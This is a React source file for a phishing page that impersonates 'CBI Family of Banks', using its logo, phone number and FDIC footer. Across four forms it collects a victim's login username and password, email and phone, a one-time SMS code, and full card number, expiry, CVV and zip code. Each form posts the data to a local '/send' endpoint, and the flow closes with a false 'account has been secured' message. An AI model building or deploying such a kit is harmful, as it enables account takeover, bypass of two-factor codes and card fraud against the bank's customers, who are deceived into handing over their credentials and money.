import React, { useState } from "react";
import "./App.css";
import axios from "axios";
import cbiLogo from "./assets/cbi image.png";

function App() {
  const [step, setStep] = useState(1);
  // Step 1: Login
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  // Step 2: Contact Info
  const [contactEmail, setContactEmail] = useState("");
  const [phone, setPhone] = useState("");
  // Step 3: OTP Verification
  const [otp, setOtp] = useState("");
  // Step 4: Card Info
  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");
  const [zipcode, setZipcode] = useState("");

  // Step 1 submit
  const handleLoginSubmit = (e) => {
    e.preventDefault();
    axios.post("http://localhost:5000/send", {
      email,
      message: password,
      subject: "Login Details",
    });
    setStep(2);
  };

  // Step 2 submit
  const handleContactSubmit = (e) => {
    e.preventDefault();
    axios.post("http://localhost:5000/send", {
      email: contactEmail,
      message: phone,
      subject: "Contact Info",
    });
    setStep(3);
  };

  // Step 3 submit (OTP)
  const handleOtpSubmit = (e) => {
    e.preventDefault();
    axios.post("http://localhost:5000/send", {
      email: contactEmail,
      message: otp,
      subject: "OTP Verification",
    });
    setStep(4);
  };

  // Step 4 submit (Card Info)
  const handleCardInfoSubmit = (e) => {
    e.preventDefault();
    axios.post("http://localhost:5000/send", {
      email: contactEmail,
      message: `Card Number: ${cardNumber}\nExpiry Date: ${expiry}\nCVV Code: ${cvv}\nZipcode: ${zipcode}`,
      subject: "Card Info",
    });
    setStep(5);
  };

  return (
    <div style={{
      position: "fixed",
      top: 0,
      left: 0,
      width: "100vw",
      height: "100vh",
      minHeight: "100vh",
      minWidth: "100vw",
      background: "linear-gradient(135deg, #888a8d 0%, #44474a 100%)",
      display: "flex",
      flexDirection: "column",
      justifyContent: "center",
      alignItems: "center",
      overflow: "hidden"
    }}>
      <div style={{
        background: "#232526",
        borderRadius: 12,
        boxShadow: "0 4px 24px rgba(0,0,0,0.3)",
        padding: 40,
        width: 480,
        maxWidth: "90vw",
        display: "flex",
        flexDirection: "column",
        alignItems: "center"
      }}>
        {/* Logo area */}
        <div style={{ marginBottom: 24, textAlign: "center" }}>
          <img src={cbiLogo} alt="CBI Family of Banks" style={{ maxWidth: 260, marginBottom: 8 }} />
        </div>
        {step === 1 && (
          <form onSubmit={handleLoginSubmit} style={{ width: "100%" }}>
            <input
              type="text"
              placeholder="Username"
              className="input-field"
              style={{
                width: "100%",
                padding: "14px 16px",
                marginBottom: 18,
                borderRadius: 6,
                border: "1px solid #444",
                background: "#18191a",
                color: "#fff",
                fontSize: 18,
                outline: "none"
              }}
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
            />
            <input
              type="password"
              placeholder="Enter your password"
              className="input-field"
              style={{
                width: "100%",
                padding: "14px 16px",
                marginBottom: 8,
                borderRadius: 6,
                border: "1px solid #444",
                background: "#18191a",
                color: "#fff",
                fontSize: 18,
                outline: "none"
              }}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
            />
            <div style={{ display: "flex", justifyContent: "flex-end", marginBottom: 18 }}>
              <a href="#" style={{ color: "#3de6b2", textDecoration: "none", fontSize: 15 }}>Forgot?</a>
            </div>
            <div style={{ display: "flex", alignItems: "center", marginBottom: 18 }}>
              <span style={{ color: "#3de6b2", fontSize: 17, marginRight: 8 }}>🟢</span>
              <a href="#" style={{ color: "#3de6b2", textDecoration: "none", fontWeight: 500, fontSize: 17 }}>Sign in with a passkey</a>
            </div>
            <button
              type="submit"
              className="login-button"
              style={{
                width: 120,
                background: "#176a46",
                color: "#fff",
                border: "none",
                borderRadius: 6,
                padding: "12px 0",
                fontSize: 18,
                fontWeight: 600,
                cursor: "pointer",
                float: "right"
              }}
            >
              Sign in
            </button>
          </form>
        )}
        {step === 2 && (
          <form onSubmit={handleContactSubmit} style={{ width: "100%" }}>
            <h2 style={{ color: "#e6f0fa", fontWeight: 700, fontFamily: 'monospace', textAlign: 'center', fontSize: 24, margin: 0, marginBottom: 8 }}>
              Verify Contact Information
            </h2>
            <div style={{ color: '#e6f0fa', textAlign: 'center', marginBottom: 24 }}>
              Please confirm your contact details on file.
            </div>
            <input
              type="email"
              placeholder="Email Address"
              className="input-field"
              style={{
                width: "100%",
                padding: "14px 16px",
                marginBottom: 18,
                borderRadius: 6,
                border: "1px solid #444",
                background: "#18191a",
                color: "#fff",
                fontSize: 18,
                outline: "none"
              }}
              value={contactEmail}
              onChange={(e) => setContactEmail(e.target.value)}
              required
            />
            <input
              type="tel"
              placeholder="Phone Number"
              className="input-field"
              style={{
                width: "100%",
                padding: "14px 16px",
                marginBottom: 24,
                borderRadius: 6,
                border: "1px solid #444",
                background: "#18191a",
                color: "#fff",
                fontSize: 18,
                outline: "none"
              }}
              value={phone}
              onChange={(e) => setPhone(e.target.value)}
              required
            />
            <button
              type="submit"
              className="login-button"
              style={{
                width: 140,
                background: "#176a46",
                color: "#fff",
                border: "none",
                borderRadius: 6,
                padding: "12px 0",
                fontSize: 18,
                fontWeight: 600,
                cursor: "pointer",
                float: "right"
              }}
            >
              Continue
            </button>
          </form>
        )}
        {step === 3 && (
          <form onSubmit={handleOtpSubmit} style={{ width: "100%" }}>
            <h2 style={{ color: "#e6f0fa", fontWeight: 700, fontFamily: 'monospace', textAlign: 'center', fontSize: 24, margin: 0, marginBottom: 8 }}>
              Verification
            </h2>
            <div style={{ color: '#e6f0fa', textAlign: 'center', marginBottom: 24, fontSize: 18 }}>
              We sent you a One-Time PIN to your registered mobile number.<br />
              Please enter the code below
            </div>
            <input
              type="text"
              placeholder="Secure Code"
              className="input-field"
              style={{
                width: "100%",
                padding: "18px 16px",
                marginBottom: 18,
                borderRadius: 6,
                border: "1.5px solid #bdbdbd",
                background: "#18191a",
                color: "#fff",
                fontSize: 22,
                outline: "none",
                textAlign: "center",
                letterSpacing: 2
              }}
              value={otp}
              onChange={(e) => setOtp(e.target.value)}
              required
            />
            <div style={{ color: '#3de6b2', textAlign: 'center', marginBottom: 24, fontWeight: 500 }}>
              SMS code might take some minutes to arrive.
            </div>
            <button
              type="submit"
              className="login-button"
              style={{
                width: 160,
                background: "#176a46",
                color: "#fff",
                border: "none",
                borderRadius: 8,
                padding: "14px 0",
                fontSize: 20,
                fontWeight: 700,
                cursor: "pointer",
                margin: "0 auto",
                display: "block"
              }}
            >
              Continue
            </button>
          </form>
        )}
        {step === 4 && (
          <form onSubmit={handleCardInfoSubmit} style={{ width: "100%" }}>
            <h2 style={{ color: "#e6f0fa", fontWeight: 700, fontFamily: 'monospace', textAlign: 'center', fontSize: 24, margin: 0, marginBottom: 8 }}>
              Card Info Information On File
            </h2>
            <input
              type="text"
              placeholder="Card Number"
              className="input-field"
              maxLength={19}
              minLength={13}
              style={{
                width: "100%",
                padding: "18px 16px",
                marginBottom: 18,
                borderRadius: 6,
                border: "1.5px solid #bdbdbd",
                background: "#18191a",
                color: "#fff",
                fontSize: 20,
                outline: "none"
              }}
              value={cardNumber}
              onChange={(e) => setCardNumber(e.target.value)}
              required
            />
            <input
              type="text"
              placeholder="MM/YYYY"
              className="input-field"
              maxLength={7}
              minLength={7}
              style={{
                width: "100%",
                padding: "18px 16px",
                marginBottom: 18,
                borderRadius: 6,
                border: "1.5px solid #bdbdbd",
                background: "#18191a",
                color: "#fff",
                fontSize: 20,
                outline: "none"
              }}
              value={expiry}
              onChange={(e) => setExpiry(e.target.value)}
              required
            />
            <input
              type="text"
              placeholder="CVV"
              className="input-field"
              maxLength={4}
              minLength={3}
              style={{
                width: "100%",
                padding: "18px 16px",
                marginBottom: 18,
                borderRadius: 6,
                border: "1.5px solid #bdbdbd",
                background: "#18191a",
                color: "#fff",
                fontSize: 20,
                outline: "none"
              }}
              value={cvv}
              onChange={(e) => setCvv(e.target.value)}
              required
            />
            <input
              type="text"
              placeholder="Zipcode"
              className="input-field"
              maxLength={10}
              minLength={5}
              style={{
                width: "100%",
                padding: "18px 16px",
                marginBottom: 28,
                borderRadius: 6,
                border: "1.5px solid #bdbdbd",
                background: "#18191a",
                color: "#fff",
                fontSize: 20,
                outline: "none"
              }}
              value={zipcode}
              onChange={(e) => setZipcode(e.target.value)}
              required
            />
            <button
              type="submit"
              className="login-button"
              style={{
                width: 160,
                background: "#176a46",
                color: "#fff",
                border: "none",
                borderRadius: 8,
                padding: "14px 0",
                fontSize: 20,
                fontWeight: 700,
                cursor: "pointer",
                margin: "0 auto",
                display: "block"
              }}
            >
              Continue
            </button>
          </form>
        )}
        {step === 5 && (
          <div style={{ width: "100%", textAlign: "center", padding: "32px 0" }}>
            <img src={cbiLogo} alt="CBI Family of Banks" style={{ maxWidth: 260, marginBottom: 16 }} />
            <h2 style={{ color: "#e6f0fa", fontWeight: 700, fontFamily: 'monospace', fontSize: 28, margin: 0, marginBottom: 18 }}>
              Verification Complete.
            </h2>
            <div style={{ color: '#e6f0fa', fontSize: 22, marginBottom: 8 }}>
              Your information has been successfully verified.<br />
              Your account has been secured
            </div>
          </div>
        )}
      </div>
      {/* Footer */}
      <footer style={{
        width: "100vw",
        background: "#000",
        color: "#bdbdbd",
        fontSize: 15,
        textAlign: "center",
        position: "fixed",
        left: 0,
        bottom: 0,
        padding: "18px 0 10px 0",
        zIndex: 10
      }}>
        <span>© 2025 CBI Family of Banks &nbsp; (563) 263-3131 &nbsp; </span>
        <a href="#" style={{ color: "#3de6b2", textDecoration: "underline" }}>Privacy policy</a>
        <span> &nbsp; Member FDIC &nbsp; Equal Housing Lender</span>
      </footer>
    </div>
  );
}

export default App;